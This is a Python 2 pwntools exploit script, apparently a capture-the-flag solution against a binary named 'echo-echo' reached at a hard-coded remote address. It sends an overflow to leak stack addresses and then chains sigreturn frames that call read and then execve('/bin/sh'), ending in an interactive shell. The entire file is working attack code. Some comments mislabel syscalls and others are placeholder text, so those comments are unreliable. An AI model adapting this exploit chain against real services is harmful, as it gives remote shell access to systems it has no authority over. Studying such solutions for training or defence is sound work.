```python
#!/usr/bin/python2
from pwn import *
from sys import *

context.arch = "amd64"

'''
0   read            asfasf
1   write           asfasf  
9   sys_mmap        unsigned long addr  unsigned long len   unsigned long prot  unsigned long flags unsigned long fd    unsigned long off
10  sys_mprotect    unsigned long start size_t len  unsigned long prot
59  sys_execve      const char *filename    const char *const argv[]    const char *const envp[]
'''

if(len(argv) == 2):
    p = connect("147.182.172.200", 9002)
else:
    p = process('echo-echo')

syscall = 0x000000000040009b
ret = 0x0000000000400060
write = 0x000000000040009d # : mov eax, 1; mov edi, 1; syscall; ret; 
writehex = 0x4000af # 0x00000000004000af
readhex = 0x0000000000400096 # : mov eax, 0; syscall; 


context.arch = "amd64"


context.log_level = 'DEBUG'
start2 = 0x0000000000400085
pload = ""
pload += "A" * 8
pload += p64(writehex)
pload += p64(start2)
# pause()
p.sendline(pload)

cmd = """
b *0x000000000040009D
"""
if(len(argv) == 3):
    gdb.attach(p, cmd)


p.recvuntil('A' * 8)
print hex(u64(p.recv(8)))
print hex(u64(p.recv(8)))
print hex(u64(p.recv(8)))
print hex(u64(p.recv(8)))
print hex(u64(p.recv(8)))
print hex(u64(p.recv(8)))
print hex(u64(p.recv(8)))
print hex(u64(p.recv(8)))
stackleak = p.recv(8)
stackleak = u64(stackleak)
print "stackleak",hex(stackleak)

shellcode_loc = stackleak - 690 + 8
print "shellcode_loc",hex(shellcode_loc)


read = 0x0000000000400091


frame = SigreturnFrame()
frame.rax = 0 # sys_execve
frame.rdi = 0 # our .data segment
frame.rsi = stackleak - 0x30
frame.rdx = 0x200
frame.rsp = stackleak - 0x10
frame.rip = syscall


print repr(frame)
print repr(str(frame))

pload =  "A"  * 8
pload += p64(read)
pload += p64(syscall)
pload += str(frame)

p.sendline( pload )
# pause()
# setup rax
payload = "A" * 14

p.sendline(payload)
# pause()

print "to", hex(stackleak-0x50)

frame2 = SigreturnFrame()
frame2.rax = 59 # sys_execve
frame2.rdi = stackleak - 0x30+8+8 # our .data segment
frame2.rsi = 0
frame2.rdx = 0
frame2.rsp = stackleak - 0x10
frame2.rip = syscall


# frame2 = SigreturnFrame()
# frame2.rax = 1 # sys_execve
# frame2.rdi = 1
# frame2.rsi = stackleak - 0x50+8+8 # our .data segment
# frame2.rdx = 1000
# frame2.rsp = stackleak - 0x10
# frame2.rip = syscall

payload = "/bin/sh\x00" * 4
payload += p64(read)
payload += p64(syscall)
payload += str(frame2)
# p.interactive()
p.sendline(payload)
# pause()

payload = "A" * 14
# p.sendline(payload)


p.interactive()
```